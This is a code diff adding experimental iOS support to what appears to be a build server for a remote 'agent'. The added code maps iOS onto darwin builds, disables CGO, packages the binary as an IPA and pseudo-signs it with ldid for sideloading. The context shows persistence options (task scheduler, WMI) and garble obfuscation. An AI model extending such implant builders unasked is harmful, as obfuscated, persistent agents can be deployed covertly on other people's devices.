@@ -265,6 +265,7 @@ export async function startBuildProcess(
     const hasBsdTargets = platformsToBuild.some(
       (p) => p.startsWith("freebsd-") || p.startsWith("openbsd-"),
     );
+    const hasIosTargets = platformsToBuild.some((p) => p.startsWith("ios-"));
 
     if (hasAndroidTargets) {
       sendToStream({
@@ -278,6 +279,14 @@ export async function startBuildProcess(
       sendToStream({
         type: "output",
         text: "WARNING: BSD targets are severely untested and will probably not work right.\n",
+        level: "warn",
+      });
+    }
+
+    if (hasIosTargets) {
+      sendToStream({
+        type: "output",
+        text: "WARNING: iOS targets are experimental (POC). Most features will be stubbed. CGO will be force-disabled.\n",
         level: "warn",
       });
     }
@@ -610,7 +619,10 @@ func runBoundFiles() {
       const [os, arch, ...rest] = platform.split("-");
       const goarm = arch === "armv7" ? "7" : undefined;
       const actualArch = goarm ? "arm" : arch;
-      const targetKey = `${os}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
+      // iOS builds use GOOS=darwin with a custom build tag since GOOS=ios requires CGO/Xcode
+      const isIosTarget = os === "ios";
+      const effectiveOs = isIosTarget ? "darwin" : os;
+      const targetKey = `${effectiveOs}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
       const namePrefix = config.outputName || "agent";
       const winExt = config.outputExtension || ".exe";
       const outputName = deps.sanitizeOutputName(
@@ -622,7 +634,7 @@ func runBoundFiles() {
 
       const env: NodeJS.ProcessEnv = {
         ...process.env,
-        GOOS: os,
+        GOOS: effectiveOs,
         GOARCH: actualArch,
         CGO_ENABLED: config.disableCgo === true ? "0" : "1",
         GOWORK: "off",
@@ -636,6 +648,15 @@ func runBoundFiles() {
         sendToStream({
           type: "output",
           text: "WARNING: windows/arm64 builds do not support CGO in this pipeline; forcing CGO disabled for this target.\n",
+          level: "warn",
+        });
+      }
+
+      if (isIosTarget && env.CGO_ENABLED === "1") {
+        env.CGO_ENABLED = "0";
+        sendToStream({
+          type: "output",
+          text: "WARNING: iOS builds require Xcode toolchain for CGO; forcing CGO disabled for this target.\n",
           level: "warn",
         });
       }
@@ -808,9 +829,10 @@ func runBoundFiles() {
           if (methods.includes("taskscheduler")) buildTags.push("persist_taskscheduler");
           if (methods.includes("wmi")) buildTags.push("persist_wmi");
         }
+        if (isIosTarget) buildTags.push("ios_target");
         const tagArg = buildTags.length > 0 ? `-tags "${buildTags.join(" ")}" ` : "";
         logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${tagArg}${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
-        logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${os} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED} CC=${env.CC || "<default>"}`);
+        logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${effectiveOs} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED} CC=${env.CC || "<default>"}${isIosTarget ? " (iOS target via darwin+ios_target tag)" : ""}`);
 
         const garbleFlags: string[] = [];
         if (config.obfuscate) {
@@ -930,6 +952,118 @@ func runBoundFiles() {
             sendToStream({ type: "output", text: `WARNING: Failed to generate bat wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
           }
         }
+
+        // ── IPA packaging for iOS targets ──────────────────────────────────────
+        if (os === "ios") {
+          sendToStream({ type: "output", text: `Packaging ${outputName} as IPA...\n`, level: "info" });
+          try {
+            const appName = config.outputName || "Agent";
+            const bundleId = config.iosBundleId || "com.overlord.agent";
+            const ipaWorkDir = path.join(outDir, `_ipa_${platform}`);
+            const payloadAppDir = path.join(ipaWorkDir, "Payload", `${appName}.app`);
+
+            // Create Payload/App.app structure
+            fs.mkdirSync(payloadAppDir, { recursive: true });
+
+            // Copy binary into .app
+            fs.copyFileSync(filePath, path.join(payloadAppDir, appName));
+            fs.chmodSync(path.join(payloadAppDir, appName), 0o755);
+
+            // Generate Info.plist
+            const infoPlist = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>CFBundleExecutable</key>
+	<string>${appName}</string>
+	<key>CFBundleIdentifier</key>
+	<string>${bundleId}</string>
+	<key>CFBundleName</key>
+	<string>${appName}</string>
+	<key>CFBundleDisplayName</key>
+	<string>${appName}</string>
+	<key>CFBundleVersion</key>
+	<string>${agentVersion}</string>
+	<key>CFBundleShortVersionString</key>
+	<string>${agentVersion}</string>
+	<key>CFBundlePackageType</key>
+	<string>APPL</string>
+	<key>CFBundleSupportedPlatforms</key>
+	<array>
+		<string>iPhoneOS</string>
+	</array>
+	<key>MinimumOSVersion</key>
+	<string>14.0</string>
+	<key>CFBundleInfoDictionaryVersion</key>
+	<string>6.0</string>
+	<key>LSRequiresIPhoneOS</key>
+	<true/>
+	<key>UIDeviceFamily</key>
+	<array>
+		<integer>1</integer>
+		<integer>2</integer>
+	</array>
+	<key>UISupportedInterfaceOrientations</key>
+	<array>
+		<string>UIInterfaceOrientationPortrait</string>
+	</array>
+</dict>
+</plist>`;
+            fs.writeFileSync(path.join(payloadAppDir, "Info.plist"), infoPlist, "utf8");
+
+            // Attempt pseudo-signing with ldid if available
+            try {
+              const ldidResult = await $`which ldid`.nothrow().quiet();
+              if (ldidResult.exitCode === 0) {
+                const ldidSign = await $`ldid -S ${path.join(payloadAppDir, appName)}`.nothrow().quiet();
+                if (ldidSign.exitCode === 0) {
+                  sendToStream({ type: "output", text: `Pseudo-signed with ldid\n`, level: "info" });
+                } else {
+                  sendToStream({ type: "output", text: `WARNING: ldid signing failed (non-fatal)\n`, level: "warn" });
+                }
+              } else {
+                sendToStream({ type: "output", text: `ldid not found; skipping pseudo-signing (install ldid for TrollStore/sideload compatibility)\n`, level: "warn" });
+              }
+            } catch { /* ldid is optional */ }
+
+            const ipaName = `${outputName}.ipa`;
+            const ipaPath = path.join(outDir, ipaName);
+            const zipResult = await $`cd ${ipaWorkDir} && zip -r ${ipaPath} Payload/ 2>&1 || true`.nothrow().quiet();
+
+            // Fallback: if system zip isn't available, try creating it manually
+            if (!fs.existsSync(ipaPath)) {
+              // Use a simple tar+gzip approach as last resort — though real IPAs need zip
+              sendToStream({ type: "output", text: `WARNING: zip command not available. Outputting raw Mach-O binary instead of IPA.\n`, level: "warn" });
+            } else {
+              // Remove the raw binary, replace with IPA
+              fs.unlinkSync(filePath);
+              finalSize = fs.statSync(ipaPath).size;
+              sendToStream({ type: "output", text: `IPA packaged: ${finalSize} bytes\n`, level: "info" });
+
+              // Update output references to point to the IPA
+              const ipaOutputName = outputName.endsWith(".ipa") ? outputName : `${outputName}.ipa`;
+
+              // Clean up temp dirs
+              fs.rmSync(ipaWorkDir, { recursive: true, force: true });
+
+              // Push IPA file entry instead of raw binary
+              (build.files as any[]).push({
+                name: ipaOutputName,
+                filename: ipaOutputName,
+                platform,
+                version: agentVersion,
+                size: finalSize,
+              });
+              continue; // Skip the default file push below
+            }
+
+            // Clean up temp dirs
+            fs.rmSync(ipaWorkDir, { recursive: true, force: true });
+          } catch (ipaErr: any) {
+            sendToStream({ type: "output", text: `WARNING: IPA packaging failed: ${ipaErr.message || ipaErr}. Output is a raw Mach-O binary.\n`, level: "warn" });
+          }
+        }
+        // ── End IPA packaging ─────────────────────────────────────────────────
 
         (build.files as any[]).push({
           name: outputName,
